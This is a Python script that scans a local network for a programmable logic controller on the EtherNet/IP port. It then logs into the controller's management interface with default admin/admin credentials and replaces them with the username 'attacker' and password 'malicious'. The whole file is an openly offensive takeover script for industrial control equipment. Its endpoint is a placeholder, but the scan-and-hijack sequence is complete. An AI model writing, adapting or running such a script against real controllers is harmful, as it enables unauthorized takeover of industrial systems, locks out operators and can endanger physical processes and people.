import socket
import requests
from requests.auth import HTTPBasicAuth

# Function to discover the PLC's IP address
def discover_plc_ip():
    # Replace with your network range
    network = "192.168.1."
    for i in range(1, 255):
        ip = network + str(i)
        try:
            socket.create_connection((ip, 44818), timeout=0.1)
            print(f"PLC found at IP: {ip}")
            return ip
        except:
            continue
    print("PLC not found on the network.")
    return None

# Function to change the PLC's credentials
def change_plc_credentials(ip, new_username, new_password):
    # URL for the PLC's management interface (replace with the actual endpoint)
    url = f"http://{ip}/api/change_credentials"
    
    # Current credentials (replace with the actual credentials)
    current_username = "admin"
    current_password = "admin"
    
    # Payload with new credentials
    payload = {
        "username": new_username,
        "password": new_password
    }
    
    # Send the request to change credentials
    try:
        response = requests.post(url, auth=HTTPBasicAuth(current_username, current_password), json=payload)
        if response.status_code == 200:
            print(f"Credentials changed successfully. New username: {new_username}, New password: {new_password}")
        else:
            print(f"Failed to change credentials. Status code: {response.status_code}")
    except Exception as e:
        print(f"An error occurred: {e}")

# Main script execution
if __name__ == "__main__":
    # Step 1: Discover the PLC's IP address
    plc_ip = discover_plc_ip()
    
    if plc_ip:
        # Step 2: Change the PLC's credentials
        new_username = "attacker"
        new_password = "malicious"
        change_plc_credentials(plc_ip, new_username, new_password)
    else:
        print("PLC IP address could not be discovered.")